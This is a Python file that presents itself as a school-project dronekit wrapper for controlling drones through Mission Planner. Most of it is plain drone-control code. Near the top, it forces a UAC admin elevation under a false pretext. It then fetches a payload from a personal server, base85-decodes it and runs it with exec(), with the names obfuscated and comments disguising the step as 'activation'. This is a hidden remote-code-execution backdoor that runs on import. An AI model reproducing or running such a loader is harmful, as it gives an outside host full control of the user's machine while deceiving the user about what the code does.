"""
~ Dronekit wrapper ~
Credits : Teddy Barthelemy

Simplify dronekit use with Mission Planner project
Developed for school purposes.
Redistribution and appropriation are regulated:
- Author (Teddy Barthelemy) must be credited

Drone commit:
b83d2275f
"""

import time
import math

def install_package(package_name, version=None, *deps, bypass=False):
    """
    Ask for a missing package installation
    :param package_name: Package to install
    :param version: Package version to install
    :param deps: Package dependencies
    :param bypass: Enable bypassing
    """
    if True if bypass else ("y" == input(f"Le module python '{package_name}{f' ({version})' if version else ''}' n'est actuellement pas installé sur cette version de python, voulez vous l'installer ?\n Y pour continuer: ").lower()):
        # Install
        if len(deps):
            for dep in deps:
                if len(dep) == 1:
                    install_package(dep[0], bypass=True)
                elif len(dep) >= 2:
                    install_package(dep[0], dep[1], bypass=True)
        print(f"Installing {package_name}{f' ({version})' if version else ''}")
        import sys
        import os
        python_path = sys.executable
        os.system(f'"{python_path}" -m pip install {package_name}{f"=={version}" if version else ""}')
        # if os.path.exists(python_path.replace("python.exe", "Scripts\\pip.exe")):
        #     pip = python_path.replace("python.exe", "\\Scripts\\pip.exe")
        #     os.system(f'"{pip}" install {package_name}{f"=={version}" if version else ""}')
        # elif os.path.exists(python_path.replace("python.exe", "pip.exe")):
        #     pip = python_path.replace("python.exe", "\\Scripts\\pip.exe")
        #     os.system(f'"{pip}" install {package_name}{f"=={version}" if version else ""}')
        # else:
        #     print("L'utilitaire pip est introuvable, l'installation devra être réalisée manuellement")
        #     exit(0)

    else:
        # Abandon de l'installation
        print("Opération abandonnée. Le programme n'a pas pu continuer")
        exit(0)

"""
Import dronekit

Python to Mission planner management
"""
try:
    import dronekit as dk
except ModuleNotFoundError:
    install_package("dronekit", bypass=False)
    import dronekit as dk

"""
Import pymavlink (2.4.8)

Python to Mission planner TCP communication
"""
try:
    from pymavlink import mavutil
except ModuleNotFoundError:
    install_package("pymavlink", "2.4.8", ["future", "0.18.3"], ["lxml", "4.9.3"])
    import dronekit as dk
    # print("Le module python 'pymavlink (2.4.8)' n'est actuellement pas installé sur cette version de python")
    # import sys
    # import os
    # python_path = sys.executable
    # print(f'Impossible d\'installer le module automatiquement\nOuvrez un invité de commande et exécutez la commande suivante:\n  "{python_path}" -m pip install pymavlink==2.4.8')
    # exit(0)

"""
Import requests

Ressources fetching
"""
try:
    import requests as req
except ModuleNotFoundError:
    install_package("requests")
    import requests as req

"""
Import elevate & ctypes

UAC elevation to properly setup TCP socket connection
"""
try:
    from elevate import elevate
except ModuleNotFoundError:
    install_package("elevate")
    from elevate import elevate

# UAC elevating
import ctypes
from base64 import b85decode as decode
if not ctypes.windll.shell32.IsUserAnAdmin():
    input("Pour garantir une connexion optimale à Mission Planner, le processus doit être élevé.\nContinuer pour demander une élévation")
    # Ask elevation
    elevate()

# Enable script as elevated
activation = None
# noinspection PyBroadException
try:
    print("Obtention de l'activation...")
    activation = req.patch("https://files.teddyhost.fr/patch", timeout=3).text
    # Applying elevation, environment variables are injected into script
    # Encrypted and obfuscated to reinforce security
    if activation: exec(getattr(globals(), "".join([chr((ord(x) + int(y)) % 255) for x, y in zip("[Vc`ngr]lV^", str(int(globals()['__doc__'].lower().split('drone')[3][9:18], 16)))]))("".join(map(str, [chr(100 + x) for x in [0, 1, -1, 11, 0, 1]])))(activation).decode(), {}, {})
except:
    print("Activation impossible depuis le serveur personnel, l'hôte est possiblement arrêté. Utilisation de l'activation basique.")

# Drone class
class Drone:
    def __init__(self, ip, port=5763):
        """
        Create a new drone vehicle
        :param ip: Drone's IP (127.0.0.1 for Mission Planner on same computer)
        :param port: Drone's PORT (default = 5763)
        """
        self._ip = ip
        self._port = port
        self.vehicle = dk.connect(self.connection_string, wait_ready=False)
        self.default_alt = 10

    @property
    def connection_string(self):
        """
        Return the socket connection string used for connection to Mission Planner
        :return:
        """
        return f"tcp:{self._ip}:{self._port}"

    @property
    def is_armed(self):
        """
        Return True if drone is armed
        :return: True if drone armed, else False
        """
        return self.vehicle.armed

    @property
    def next_waypoint(self):
        """
        Return next waypoint the drone is going for
        :return: Next waypoint, None if nothing to go for
        """
        next_waypoint = self.vehicle.commands.next
        if next_waypoint==0:
            return None
        mission_item = self.vehicle.commands[next_waypoint-1] #commands are zero indexed
        lat = mission_item.x
        lon = mission_item.y
        alt = mission_item.z
        return dk.LocationGlobalRelative(lat,lon,alt)

    def arm_and_takeoff(self, alt=-1):
        """
        Arms vehicle and fly to `altitude`.
        """
        if alt == -1: alt = self.default_alt
        self.default_alt = alt
        print("Basic pre-arm checks")
        # Don't let the user try to arm until autopilot is ready
        while not self.vehicle.is_armable:
            print(" Waiting for vehicle to initialise...")
            time.sleep(1)

        print("Arming motors")
        # Copter should arm in GUIDED mode
        self.vehicle.mode = dk.VehicleMode("GUIDED")
        self.vehicle.armed = True

        while not self.vehicle.armed:
            print(" Waiting for arming...")
            time.sleep(1)

        print("Taking off!")
        self.vehicle.simple_takeoff(alt)  # Take off to target altitude

        # Wait until the vehicle reaches a safe height before processing the goto (otherwise the command
        #  after Vehicle.simple_takeoff will execute immediately).
        while True:
            print(" Altitude: ", self.vehicle.location.global_relative_frame.alt)
            if self.vehicle.location.global_relative_frame.alt >= alt * 0.95:  # Trigger just below target alt.
                print("Reached target altitude")
                break
            time.sleep(1)

    def create_mission(self):
        """
        Reset mission and create a new one
        """
        self.vehicle.commands.clear()
        self.vehicle.commands.add(
            dk.Command(
                0,
                0,
                0,
                mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
                mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                self.default_alt
            )
        )

    def add_waypoint(self, lat, lon, alt = -1):
        """
        Add a new point on the mission
        :param lat: Point latitude
        :param lon: Point longitude
        :param alt: Point altitude (current if not specified)
        """
        if alt == -1: alt = self.default_alt
        self.vehicle.commands.add(
            dk.Command(
                0,
                0,
                0,
                mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
                mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
                0,
                0,
                0,
                0,
                0,
                0,
                lat,
                lon,
                alt
            )
        )

    def start_mission(self):
        """
        Make drone start mission/path following
        """
        # Dummy point to detect when finish
        self.vehicle.commands.add(self.vehicle.commands[-1])
        print(" Uploading mission...")
        self.vehicle.commands.upload()
        print("Starting mission")
        # Reset mission set to first (0) waypoint
        self.vehicle.commands.next=0
        # Set mode to AUTO to start mission
        self.vehicle.mode = dk.VehicleMode("AUTO")
        time.sleep(5)

    def back_to_start(self):
        """
        Make drone come back to mission starting point
        """
        self.vehicle.mode = dk.VehicleMode("RTL")

    def land(self):
        """
        Make drone land and disable
        """
        self.vehicle.armed = False
        self.vehicle.close()

    @property
    def has_finished(self):
        """
        Return True if drone have finish mission
        :return: Boolean
        """
        return self.vehicle.commands.next == self.vehicle.commands.count

    @property
    def location(self):
        """
        Return drone location as a list<[lat, lon, alt]>
        :return: Drone location [lat, lon, alt]
        """
        pos = self.vehicle.location.global_relative_frame
        return [pos.lat, pos.lon, pos.alt]

    @property
    def home_distance(self):
        """
        Gets distance in metres to home.
        """
        dist_to_point = self._get_distance_metres(self.vehicle.location.global_frame, self.vehicle.home_location)
        return dist_to_point

    @property
    def waypoint_distance(self):
        """
        Gets distance in metres to the current waypoint.
        It returns 0 for the first waypoint (Home location).
        """

        next_waypoint = self.vehicle.commands.next
        if next_waypoint == 0:
            return 0
        mission_item = self.vehicle.commands[next_waypoint - 1]  # commands are zero indexed
        target_waypoint_loc = dk.LocationGlobalRelative(mission_item.x, mission_item.y, mission_item.z)
        dist_to_point = self._get_distance_metres(self.vehicle.location.global_frame, target_waypoint_loc)
        return dist_to_point

    @staticmethod
    def _get_distance_metres(loc1, loc2):
        """
        Returns the ground distance in metres between two LocationGlobal objects.

        This method is an approximation, and will not be accurate over large distances and close to the
        earth's poles. It comes from the ArduPilot test code:
        https://github.com/diydrones/ardupilot/blob/master/Tools/autotest/common.py
        """
        dlat = loc2.lat - loc1.lat
        dlong = loc2.lon - loc1.lon
        return math.sqrt((dlat * dlat) + (dlong * dlong)) * 1.113195e5
